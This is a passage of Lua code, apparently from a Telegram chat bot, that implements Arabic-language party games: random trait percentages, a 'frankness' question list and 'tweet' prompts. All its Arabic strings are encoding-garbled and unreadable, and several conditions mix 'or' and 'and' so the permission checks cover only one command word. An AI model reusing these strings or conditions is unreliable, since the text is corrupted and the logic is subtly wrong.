Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³ΩΩ ΩΨ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ«Ψ§ΩΩΨ  \n ΩΨ«Ψ§Ω Ψ§Ψ³Ψ― Ω ΩΨ¨ΩΩ'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'ΩΨ³Ψ¨Ω ΩΨ±Ω '..text..' ΩΩ : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ" or text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― ΩΩΨ§Ψ³ ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΨͺΩ \n ΩΨ«Ψ§Ω Ψ§ΩΩΨ±'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ '..text..' ΩΩ : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "Ψ΅Ψ±Ψ§Ψ­Ω" or text == "Ψ§ΩΨ΅Ψ±Ψ§Ψ­Ω" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_,"sendrkkoe")
local LEADER_Msg = {
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ΅ΩΨͺΩ Ψ­ΩΩΨ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§ΩΨͺΩΩΨͺ Ψ§ΩΩΨ§Ψ³ ΩΨΉ ΩΨ¬ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ΄ΩΨ‘ ΩΩΩΨͺ ΨͺΨ­ΩΩ Ψ§ΩΩΨ³Ψ§ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ£ΩΨ§ Ψ΄Ψ?Ψ΅ ΨΆΨΉΩΩ ΨΉΩΨ―ΩΨ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ ΨͺΨ±ΨΊΨ¨ ΩΩ Ψ₯ΨΈΩΨ§Ψ± Ψ­Ψ¨Ω ΩΩΨ±ΩΩ ΩΨ΄Ψ?Ψ΅ Ψ£Ω Ψ±Ψ€ΩΨ© ΩΨ°Ψ§ Ψ§ΩΨΆΨΉΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ―Ω ΨΉΩΩ Ψ£Ω Ψ§ΩΩΨ°Ψ¨ ΩΨ±Ψ§Ψͺ ΨͺΩΩΩ ΨΆΨ±ΩΨ±ΩΨ© Ψ΄ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ£Ψ΄ΨΉΨ± Ψ¨Ψ§ΩΩΨ­Ψ―Ψ© ΨΉΩΩ Ψ§ΩΨ±ΨΊΩ ΩΩ Ψ£ΩΩΩ ΨͺΨ­ΩΨ· Ψ¨Ω ΩΨ«ΩΨ±Ψ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΩΩΩΨ© Ψ§ΩΩΨ΄Ω ΨΉΩ ΩΩ ΩΩΩΩ ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ₯Ψ°Ψ§ Ψ­Ψ§ΩΩ Ψ΄Ψ?Ψ΅ ΩΨ§ Ψ£Ω ΩΩΨ±ΩΩ Ψ£Ω ΩΩΨͺΨ±Ψ¨ ΩΩΩ ΩΩΩΨͺΩ Ψ¨Ω ΨͺΨΉΨ·ΩΩ ΩΨ±Ψ΅Ψ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ£Ψ΄Ψ¬ΨΉ Ψ΄ΩΨ‘ Ψ­ΩΩ ΩΩ Ψ­ΩΨ§ΨͺΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ·Ψ±ΩΩΨ© Ψ¬ΩΨ―Ψ© ΩΩΩΨΉ Ψ­ΨͺΩ ΩΩ ΩΨ§ΩΨͺ Ψ§ΩΩΩΨ±Ψ© Ψ?Ψ§Ψ·Ψ¦Ψ© ΨͺΩΨ§ΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΩΩ ΨͺΨͺΨ΅Ψ±Ω ΩΨΉ ΩΩ ΩΨ³ΩΨ¦ΩΩ ΩΩΩΩ ΩΩΨ£Ψ?Ψ° ΨΉΩΩ Ψ°ΩΩΩ Ψ«Ω ΩΩΨͺΨΈΨ± Ψ£Ω ΩΨ±ΩΨΆΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§ΩΨͺΨΊΩΩΨ± Ψ§ΩΨΉΨ§Ψ―Ω ΨΉΩΨ―ΩΨ§ ΩΩΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΩΨ­Ψ¨ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§ΩΩΩΨ§ΩΩ Ψ§ΩΨ΅ΨΉΨ¨Ψ© ΨͺΨΆΨΉΩ ΩΩ ΩΩΨ§ ΨͺΨ±ΩΨΉΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨΈΨ±Ψ© Ω ΩΩΨ³Ψ― Ψ§ΩΨ΅Ψ―Ψ§ΩΨ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ββΨ₯Ψ°Ψ§ Ψ£Ψ­Ψ― ΩΨ§ΩΩ ΩΩΨ§Ω Ψ³ΩΨ‘ Ψ¨Ψ§ΩΨΊΨ§ΩΨ¨ ΩΨ΄ ΨͺΩΩΩ Ψ±Ψ―Ψ© ΩΨΉΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ΄Ψ?Ψ΅ ΩΨΉΩ Ψ¨Ψ§ΩΨ­ΩΩΩ ΩΨ§ΩΩΩΨ±ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  βΩΩ ΨͺΨ­Ψ¨ Ψ₯ΨΈΩΨ§Ψ± Ψ­Ψ¨Ω ΩΨͺΨΉΩΩΩ Ψ¨Ψ§ΩΨ΄Ψ?Ψ΅ Ψ£Ω ΨͺΨ±Ω Ψ°ΩΩ ΨΆΨΉΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΨͺΨ£Ψ?Ψ° Ψ¨ΩΩΨ§Ω Ψ§ΩΩΩ ΩΩΨ΅Ψ­Ω ΩΩΨ§ ΨͺΨ³ΩΩ Ψ§ΩΩΩ ΨͺΨ¨ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ΄ ΨͺΨͺΩΩΩ Ψ§ΩΩΨ§Ψ³ ΨͺΨΉΨ±Ω ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§Ψ¨ΩΨΉ Ψ§ΩΩΨ¬Ψ±Ψ© ΨΉΨ΄Ψ§ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ£Ψ­ΩΨ§ΩΨ§ Ψ§Ψ­Ψ³ Ψ§Ω Ψ§ΩΩΨ§Ψ³ Ψ ΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨΉ ΩΩΩ ΩΨ―Ω ΨͺΩΨ§Ω Ψ§ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ΅Ψ―ΩΨ© Ψ§ΩΨΉΩΨ± Ψ§ΩΨ­ΩΩΨ© ΩΩ Ψ§ΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§ΩΩΩΨ±Ω Ψ§ΩΨΉΨΈΩΩ Ψ―Ψ§ΩΩ ΩΨ¬Ω Ψ¨ΨΉΨ― Ψ­ΩΨ¨ ΩΩΩ ΨͺΨͺΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ΅ΩΨ© ΨͺΨ­Ψ¨ΩΨ§ ΩΩ ΩΩΨ³ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  βΨ§ΩΩΩΨ± ΩΩΨ± Ψ§ΩΨΉΩΩΩ ΩΩΨ³ Ψ§ΩΨ¬ΩΩΨ¨  Ψ ΨͺΨͺΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΨͺΨ΅ΩΩ Ψ΅ΩΩΨ§ΨͺΩ Ψ§ΩΨ?ΩΨ³ ΩΩΩΨ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  βΨͺΨ¬Ψ§ΩΩ Ψ£Ψ­Ψ― ΨΉΩΩ Ψ±Ψ§Ψ­ΨͺΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§Ψ΄Ψ¬ΨΉ Ψ΄ΩΨ‘ Ψ³ΩΩΨͺΨ© Ψ¨Ψ­ΩΨ§ΨͺΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ΄ ΩΨ§ΩΩ ΨͺΨ³ΩΩ Ψ§ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ΄ Ψ΄ΨΉΩΨ±Ω ΩΩΨ§ ΨͺΨ΄ΩΩ Ψ§ΩΩΨ·Ψ±Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΨΊΩΨ±ΨͺΩ ΩΨ§Ψ―ΩΩ ΩΩΨ§ ΨͺΨ³ΩΩ ΩΨ΄Ψ§ΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ Ψ§ΩΨ«Ψ± Ψ΄Ω ΩΨ―ΩΩ ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ§Ω Ψ§ΩΨ―ΩΩ ΨͺΨͺΩΩΩ Ψ§Ω ΨͺΨ²ΩΨ±ΩΨ§Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨͺΩ Ψ§Ψ?Ψ± ΩΨ±Ω Ψ¨ΩΩΨͺΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΨͺΩΩΩ Ψ­ΨΈΩ Ψ ΩΩ ΨΉΨ΄Ψ±ΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ ΨͺΨΉΨͺΩΨ― Ψ§Ω Ψ­ΨΈΩ Ψ³ΩΨ¦Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  Ψ΄ΩΨ?ΩΩΨ΅ ΨͺΨͺΩΩΩΩΩ Ψ§ΩΨ₯ΩΨͺΩΩΩΨ§Ω ΩΩΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΩΩΨ© ΨͺΩΨ― Ψ³ΩΨ§ΨΉΩΨ§ ΩΩ ΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  **ΩΩ ΨͺΩΨͺΩΩ ΨΉΩΩΩ Ψ£Ω ΨͺΨ΄ΨΉΨ± Ψ¨Ψ§ΩΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ ΩΩΨͺ Ψ¨Ψ§ΩΨͺΨ­Ψ§Ω Ψ£Ψ­Ψ― Ψ§ΩΨ΄Ψ?Ψ΅ΩΨ§Ψͺ ΩΨͺΩΨ°Ψ¨ ΨΉΩΩ ΩΩ Ψ­ΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨͺΩ Ψ’Ψ?Ψ± ΩΨ±Ψ© ΩΩΨͺ Ψ¨ΨΉΩΩ ΩΩΨ΄ΩΩΨ© ΩΨ¨ΩΨ±Ψ© ΩΨͺΨ³Ψ¨Ψ¨Ψͺ ΩΩ Ψ?Ψ³Ψ§Ψ¦Ψ±Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ Ψ§Ψ³ΩΨ£ Ψ?Ψ¨Ψ± Ψ³ΩΨΉΨͺΩ Ψ¨Ψ­ΩΨ§ΨͺΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  | ΩΩ Ψ¬Ψ±Ψ­Ψͺ Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨Ω ΩΩ ΩΨ¨Ω Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ Ψ§ΩΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΩ ΨͺΩΨ­Ψ¨ Ψ£Ω ΨͺΨ¨ΨͺΨΉΨ― ΨΉΩΩΨ§Ψ",
"βΨ΅Ψ±Ψ§Ψ­Ω  | ΩΩ ΨͺΨ­Ψ¨ ΨΉΨ§Ψ¦ΩΨͺΩ Ψ§Ω ΨͺΩΨ±ΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΩΨ£ΨͺΩ ΩΩ ΩΩΨ¨Ω Ψ¨ΨΉΨ― Ψ§ΩΩΩ β Ψ³Ψ¨Ψ­Ψ§ΩΩ ΩΨͺΨΉΨ§ΩΩ- ΩΨ±Ψ³ΩΩΩ Ψ§ΩΩΨ±ΩΩ β Ψ΅ΩΩ Ψ§ΩΩΩ ΨΉΩΩΩ ΩΨ³ΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ Ψ?Ψ¬ΩΨͺ ΩΩ ΩΩΨ³Ω ΩΩ ΩΨ¨ΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ Ψ§ Ψ§ΩΨ­ΩΩ  Ψ§ΩΨ°Ω ΩΩ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§Ω ΨͺΨ­ΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΨ­ΩΩ Ψ¨Ω ΩΩ ΩΩΩΨ©Ψ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ ΨͺΨΉΨ±ΨΆΨͺ Ψ₯ΩΩ ΩΩΩΩ ΩΩΨ­Ψ±Ψ¬ Ψ¬ΨΉΩΩ ΨͺΩΨ±Ω Ψ΅Ψ§Ψ­Ψ¨ΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΩ ΩΩΨͺ Ψ¨Ψ§ΩΨ¨ΩΨ§Ψ‘ Ψ£ΩΨ§Ω ΩΩ ΨͺΩΨ­Ψ¨Ψ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§Ψ°Ψ§ ΨͺΨ?ΨͺΨ§Ψ± Ψ­Ψ¨ΩΨ¨Ω Ψ£Ω Ψ΅Ψ―ΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  | ΩΩ Ψ­ΩΨ§ΨͺΩ Ψ³ΨΉΩΨ―Ψ© Ψ£Ω Ψ­Ψ²ΩΩΨ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ Ψ£Ψ¬ΩΩ Ψ³ΩΨ© ΨΉΨ΄ΨͺΩΨ§ Ψ¨Ψ­ΩΨ§ΨͺΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ ΨΉΩΨ±Ω Ψ§ΩΨ­ΩΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ Ψ§ΩΨ«Ψ± Ψ΄Ω ΩΨ―ΩΩ ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω  |  ΩΨ§ ΩΩ Ψ£ΩΩΩΨ§ΨͺΩ Ψ§ΩΩΩΨ³ΨͺΩΨ¨ΩΩΨ©Ψβ",
"Ψ΅Ψ±Ψ§Ψ­Ω  | ΩΩ ΩΨ¨ΩΨͺ ΩΨͺΨ§ΩΨ"
}
send(msg.chat_id_, msg.id_,'['..LEADER_Msg[math.random(#LEADER_Msg)]..']') 
return false
end
if text and text ~="Ψ΅Ψ±Ψ§Ψ­Ω" and database:get(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_) == "sendrkkoe" then
numj = {"Ψ§Ω Ψ§ΩΩΨ―Ψ¨ Ψ―Ψ§ π","ΩΨΉΩΨ§ Ψ¨ΨͺΨͺΩΩΩ Ψ΅Ψ­π€","ΩΨ¬Ψ―ΨΉ ΩΩΩ ΩΩΨ§Ω ΨΊΩΨ± Ψ―Ψ§πΉ","Ψ­Ψ΅Ω Ψ§ΩΩΨ§Ψ§ΩπΉπ","Ψ·Ψ¨ ΨΉΩΩΩ Ω ΨΉΩΩΩ ΩΨ―Ψ§ π","Ψ§ΩΨͺ Ψ΅Ψ­πβ₯",};
sendnuj = numj[math.random(#numj)]
xl = ' β» '..text..' Ω­ \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_)
end
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" or text == "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«Ω" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― ΩΩΨ§Ψ³ ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«ΨͺΩΨ§ \n ΩΨ«Ψ§Ω ΩΩΩΩ'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω '..text..' ΩΩ : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
------------
if text == "ΨͺΩΩΨͺ" or text == "ΩΨͺ ΨͺΩΩΨͺ" then
local TWEET_Msg = {
" Ψ§ΩΨͺ Ψ­Ψ²ΩΩ Ψ§ΩΩ Ψ΄Ψ?Ψ΅ ΨͺΨͺΨ΅Ω ΨΉΩΩΩΨ",
"ΩΨͺΩ ΨͺΩΨ±Ψ± ΨͺΩΨ³Ψ­Ψ¨ ΩΩ Ψ£Ω ΨΉΩΨ§ΩΨ© Ψ ",
"ΨͺΩΩΩ ΩΨ³ΩΨ§Ψ³ ΩΩ Ψ΄ΩΨ‘ ΩΨΉΩΩ Ψ ",
"ΩΩ Ψ£ΩΨͺ ΩΩ Ψ§ΩΩΩΨΉ Ψ§ΩΨ°Ω ΩΩΨ§Ψ¬Ω Ψ§ΩΩΨ΄Ψ§ΩΩ Ψ£Ω ΩΩ Ψ§ΩΩΩΨΉ Ψ§ΩΨ°Ω ΩΩΨ±Ψ¨ Ψ ",
" ΩΩ ΩΨ³Ψ¨Ψ© Ψ§ΩΨ¨ΩΨͺΩΨͺΩΨ© ΩΩ Ψ΄Ψ?Ψ΅ΩΨͺΩΨ",
"Ψ±Ψ―Ψ© ΩΨΉΩΩ ΩΩΩ ΩΨͺΨ¬Ψ§ΩΩΩ Ψ¨Ψ§ΩΨ±Ψ― ΩΨͺΨΉΩΨ―Ψ ",
" ΩΩΨ§Ω ΩΨ―Ω ΩΩΨ΅Ω ΩΩΨ΄Ψ?Ψ΅ Ψ§ΩΩΨ·ΩΩΨ¨ Ψ",
"Ψ£ΩΩ Ψ΄ΩΨ‘ ΩΨ?Ψ·Ψ± ΩΩ Ψ¨Ψ§ΩΩ Ψ₯Ψ°Ψ§ Ψ³ΩΨΉΨͺ ΩΩΩΨ© ΩΨ¬ΩΩ Ψ ",
"ΩΨ³ΩΨ³Ω ΩΨ±ΨͺΩΩΩ ΩΩ Ψ°ΩΨ±ΩΨ§Ψͺ Ψ¬ΩΩΩΨ© ΨΉΩΨ―ΩΨ  ",
" ΨΉΩΨ±Ω ΨΆΨ­ΩΨͺ Ψ¨Ψ§Ψ΄ΩΨ§Ψ‘ ΩΨ§Ψ¬Ω Ψ΄Ψ?Ψ΅ Ω ΩΨ³ΩΩ Ψ",
" ΨͺΨ¬Ψ§ΩΩ Ψ§ΩΩΨ§Ψ³ ΩΩΨ§ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω ΨΉΩΩ ΩΨ³Ψ§ΩΩΨ",
"Ψ¬Ψ±Ψ¨Ψͺ Ψ΄ΨΉΩΨ± Ψ§Ψ­Ψ― ΩΨ­Ψ¨Ω Ψ¨Ψ³ Ψ§ΩΨͺ ΩΩ ΩΨ§Ψ―Ψ± ΨͺΨ­Ψ¨ΩΨ ",
"Ψ§Ψ?Ψ± ΩΨͺΨ§Ψ¨ ΩΨ±Ψ’ΨͺΩ",
"Ψ§ΩΨΆΩ ΩΩΩ Ω Ψ­ΩΨ§ΨͺΩ",
"Ψ­ΩΩΨͺΩ Ω Ψ§ΩΨ­ΩΨ§Ω",
"ΩΩΩ ΨΉΩΩΩΩ",
"ΩΨ΄ Ψ§Ψ³Ω Ψ§ΩΩ Ψ΄Ψ?Ψ΅ ΨͺΨΉΨ±ΩΨͺ ΨΉΩΩΩ ΩΨ§ΩΨͺΩΩΨ±Ψ§Ω Ψ",
"ΨΉΨ§Ψ―Ω ΨͺΨͺΨ²ΩΨ¬ ΩΩ Ψ¨Ψ±Ψ§ Ψ§ΩΩΨ¨ΩΩΨ©Ψ",
" ΨͺΩΨΆΩΩ Ψ§ΩΩΩΨ§Ψ΄ Ψ§ΩΨ·ΩΩΩ Ψ§Ω ΨͺΨ­Ψ¨ Ψ§ΩΨ§Ψ?ΨͺΨ΅Ψ§Ψ± Ψ",
"ΩΨ― ΨͺΨ?ΩΩΨͺ Ψ΄Ω ΩΩ Ψ¨Ψ§ΩΩ ΩΨ΅Ψ§Ψ± Ψ",
"ΩΩ ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω Ψ§ΩΨ¨ΩΩΩ Ψ",
"Ψ³Ψ€Ψ§Ω ΩΩΨ±ΩΨ²Ω Ψ",
"Ψ£Ψ¬ΩΩ Ψ΄ΩΨ‘ Ψ­Ψ΅Ω ΩΨΉΩ Ψ?ΩΨ§Ω ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ Ψ",
"Ψ£Ψ¬ΩΩ Ψ΄ΩΨ‘ Ψ­Ψ΅Ω ΩΨΉΩ Ψ?ΩΨ§Ω ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ Ψ ",
"Ψ§ΩΩΩΩΨ³ Ψ§Ω Ψ§ΩΨ­Ψ¨ Ψ ",
" Ψ§ΩΨ§Ψ±ΨͺΨ¨Ψ§Ψ· Ψ³ΩΨ΄ΩΨ§Ω ΩΩΨ§ΩΨͺΩ Ψ§ΩΨ ",
" ΩΨ§ Ψ§ΩΨ³ΩΨ‘ ΩΩ ΩΨ°Ω Ψ§ΩΨ­ΩΨ§Ψ© Ψ ",
" ΩΨ³Ψ¨Ψ© Ψ±ΨΆΨ§Ω ΨΉΩ Ψ§ΩΨ£Ψ΄Ψ?Ψ§Ψ΅ ΩΩ Ψ­ΩΩΩ ΩΨ§ΩΩΨͺΨ±Ψ©",
" Ψ§Ω Ψ§Ψ?Ψ±ΨͺΩΨ§ ΩΨΉΩΩ ΩΨͺΩΨΆΩ ΩΨΉΨ§ΩΨ§Ψ ",
"ΩΨͺΨ§Ψ¨Ω Ψ§ΩΩΩΨΆΩ",
"ΩΩΨ§ΩΨͺΩ Ψ§ΩΩΩΨΆΩΩ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΨͺΨ?ΩΩΩ ΩΩ Ψ£ΩΩ Ψ³ΨͺΨ±Ψ³Ω Ψ΄ΩΨ‘ ΩΨ­ΩΨ― ΩΩΨ΅Ψ¨Ψ­ Ψ­ΩΩΩΨ©Ψ ΩΨ§Ψ°Ψ§ Ψ³ΨͺΨ±Ψ³ΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ£ΩΨ«Ψ± Ψ΄ΩΨ‘ ΩΩΨ³ΩΩΨͺ Ψ§ΩΨ·ΩΩ Ψ¨Ψ±Ψ£ΩΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ§ΩΨ­Ψ±ΩΨ© ΩΩ ... Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | ΩΩΨ§Ψ© Ψ§ΩΩΨ±ΨͺΩΩ Ψ§ΩΩΩΨΆΩΨ© ΩΩ Ψ·ΩΩΩΨͺΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΩΩΩΨ© ΩΩΨ΅ΩΨ―Ψ§ΨΉΨ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΩΨ§ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΩΩΨ§Ψ±ΩΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ | ΩΩΩΩ ΩΩΩΨ² ΩΨΉΩΨͺΩ ΩΨΉ Ψ΄Ψ?Ψ΅ ΩΩΨ§ ΩΨ²Ψ§Ω ΩΨ°ΩΨ±Ω ΩΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ β| Ψ£ΩΩΩΨ§ ΩΩΨͺΨ΅Ψ±Ψ Ψ§ΩΩΨ¨Ψ±ΩΨ§Ψ‘ Ψ£Ω Ψ§ΩΨ­Ψ¨Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ¨ΨΉΨ― Ω‘Ω  Ψ³ΩΩΩ Ψ§ΩΨ΄ Ψ¨ΨͺΩΩΩ Ψ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΩΩΩ Ψ£ΨΊΨ±Ψ¨ ΩΨ£Ψ¬ΩΩ Ψ§ΩΨ£Ψ³ΩΨ§Ψ‘ Ψ§ΩΨͺΩ ΩΨ±Ψͺ ΨΉΩΩΩΨ",
"βΩΨͺ ΨͺΩΩΨͺ | ΨΉΩΨ±Ω Ψ΄ΩΨͺ ΩΨ΅ΩΨ¨Ψ© ΨΉΩ Ψ΄Ψ?Ψ΅ Ψ¨Ψ±ΨΊΨ¨ΨͺΩ Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ£ΩΨ«Ψ± Ψ³Ψ€Ψ§Ω ΩΨ¬ΩΩΩ Ψ₯ΩΩΩ ΩΨ€Ψ?Ψ±ΩΨ§Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΨ¬ΨΉΩΩ ΨͺΨ΄ΨΉΨ± Ψ¨Ψ§ΩΨ?ΩΩΨ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ΄ ΩΩΨ³Ψ― Ψ§ΩΨ΅Ψ―Ψ§ΩΨ©Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | Ψ΄Ψ?Ψ΅ ΩΨ§ΨͺΨ±ΩΨΆ ΩΩ Ψ·ΩΨ¨Ψ§ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩ ΩΨ±Ω Ψ?Ψ³Ψ±Ψͺ Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨ΩΨ.",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩΩ ΨͺΨͺΨΉΨ§ΩΩ ΩΨΉ Ψ§ΩΨ§Ψ΄Ψ?Ψ§Ψ΅ Ψ§ΩΨ³ΩΨ¨ΩΩΩ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩΩΨ© ΨͺΨ΄ΨΉΨ± Ψ¨Ψ§ΩΨ?Ψ¬Ω Ψ§Ψ°Ψ§ ΩΩΩΨͺ ΩΩΨ",
